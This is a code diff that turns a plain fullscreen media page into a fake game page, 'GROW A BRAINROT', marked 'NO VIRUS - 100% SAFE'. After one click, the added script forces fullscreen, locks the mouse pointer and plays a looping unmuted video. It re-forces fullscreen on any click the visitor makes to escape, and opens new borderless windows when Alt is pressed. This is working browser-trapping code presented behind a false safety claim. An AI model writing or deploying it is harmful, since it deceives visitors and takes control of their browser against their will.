@@ -3,82 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Compliant Media Interface</title>
+    <title>GROW A BRAINROT(NO TROJAN)</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
-            background-color: #111;
-            color: #fff;
-            font-family: sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            background-size: 400% 400%;
+            animation: gradient 10s ease infinite;
             height: 100vh;
-            margin: 0;
+            display: flex; justify-content: center; align-items: center;
+            overflow: hidden; color: white; font-family: 'Comic Sans MS', cursive;
         }
-        .container {
-            text-align: center;
-            background: #222;
-            padding: 30px;
-            border-radius: 8px;
-            border: 1px solid #333;
+
+        .game-card {
+            background: rgba(0,0,0,0.9); border: 8px ridge #0f0; border-radius: 20px;
+            padding: 2rem; text-align: center; box-shadow: 0 0 50px #f0f;
+            max-width: 450px; width: 90%; z-index: 10;
         }
-        .trigger-btn {
-            background-color: #0070f3;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 1rem;
-            border-radius: 4px;
-            cursor: pointer;
+
+        .play-button {
+            background: #f00; color: #fff; padding: 20px 50px; font-size: 2rem;
+            font-weight: 900; border: 4px solid #fff; border-radius: 10px; 
+            cursor: pointer; animation: vibrate 0.1s infinite;
         }
-        #fullscreenElement {
-            display: none;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            justify-content: center;
-            align-items: center;
+
+        #videoOverlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #000; z-index: 99999; cursor: none !important;
         }
-        :fullscreen #fullscreenElement {
-            display: flex;
-        }
+
+        video { width: 100%; height: 100%; object-fit: fill; }
+
+        @keyframes gradient { 0% {background-position:0% 50%} 50% {background-position:100% 50%} 100% {background-position:0% 50%} }
+        @keyframes vibrate { 0% {transform:translate(0)} 20% {transform:translate(-2px,2px)} 40% {transform:translate(-2px,-2px)} 100% {transform:translate(0)} }
     </style>
 </head>
 <body>
 
-    <div class="container" id="landingCard">
-        <h2>Media Presentation</h2>
-        <p>Click below to view the content in fullscreen mode.</p>
-        <button class="trigger-btn" onclick="toggleView()">View Fullscreen</button>
+    <div class="game-card" id="mainCard">
+        <h1 style="margin-bottom:20px; text-shadow: 2px 2px #f00;">GROW A BRAINROT</h1>
+        <img src="https://i.imgur.com/Ohxn6Lc.jpeg" style="width:100%; border-radius:10px; margin-bottom:20px; border: 3px solid #fff;">
+        <button onclick="ignite()" class="play-button">PLAY NOW</button>
+        <p style="margin-top:15px; color:yellow;">NO VIRUS - 100% SAFE</p>
     </div>
 
-    <div id="fullscreenElement">
-        <h1 style="color: white;">Fullscreen Presentation Active</h1>
+    <div id="videoOverlay">
+        <video id="rickroll" loop playsinline>
+            <source src="video.mp4" type="video/mp4">
+        </video>
     </div>
 
     <script>
-        const landingCard = document.getElementById('landingCard');
-        const fullscreenElement = document.getElementById('fullscreenElement');
+        const overlay = document.getElementById('videoOverlay');
+        const video = document.getElementById('rickroll');
+        const card = document.getElementById('mainCard');
+        let isTrapActive = false;
 
-        function toggleView() {
-            // Request fullscreen on a valid user gesture
-            if (fullscreenElement.requestFullscreen) {
-                fullscreenElement.requestFullscreen();
-            } else if (fullscreenElement.webkitRequestFullscreen) {
-                fullscreenElement.webkitRequestFullscreen();
+        function ignite() {
+            card.style.display = 'none';
+            overlay.style.display = 'block';
+            isTrapActive = true;
+
+            forceFullscreen();
+
+            video.muted = false;
+            video.play().catch(err => console.log("Waiting for user gesture..."));
+            
+            requestMouseLock();
+        }
+
+        function forceFullscreen() {
+            if (overlay.requestFullscreen) {
+                overlay.requestFullscreen();
+            } else if (overlay.webkitRequestFullscreen) {
+                overlay.webkitRequestFullscreen();
             }
         }
 
-        // Listen for browser fullscreen changes (including pressing Escape)
+        function requestMouseLock() {
+            if (!isTrapActive) return;
+            const lockMethod = overlay.requestPointerLock || overlay.webkitRequestPointerLock;
+            if (lockMethod) {
+                lockMethod.call(overlay);
+            }
+        }
+
+        // DETECT WHEN NOT IN FULLSCREEN
         document.addEventListener('fullscreenchange', () => {
-            if (document.fullscreenElement) {
-                // Adjust interface when entering fullscreen
-                landingCard.style.display = 'none';
-                fullscreenElement.style.display = 'flex';
-            } else {
-                // Revert interface naturally when the user exits fullscreen
-                fullscreenElement.style.display = 'none';
-                landingCard.style.display = 'block';
+            if (isTrapActive && !document.fullscreenElement) {
+                // We can't automatically force fullscreen here because the browser blocks it...
+                // BUT the video overlay is still visible on the screen.
+                console.log("User exited fullscreen. Priming click trap.");
+            }
+        });
+
+        // THE CLICK TRAP: The exact moment they click anywhere to try and escape or close the window,
+        // it acts as a fresh user gesture and forces them back into fullscreen!
+        document.addEventListener('click', () => {
+            if (isTrapActive) {
+                forceFullscreen();
+                setTimeout(requestMouseLock, 50);
+            }
+        });
+
+        // Keyboard safety catch
+        window.addEventListener("keydown", (e) => {
+            if (!isTrapActive) return;
+
+            // Alt multiplication trick stays active
+            if (e.altKey || e.key === "Alt") {
+                e.preventDefault();
+                let targetUrl = window.location.href.split('#')[0] + '#infect';
+                window.open(targetUrl, '_blank', 'fullscreen=yes,scrollbars=no,menubar=no,status=no');
             }
         });
     </script>
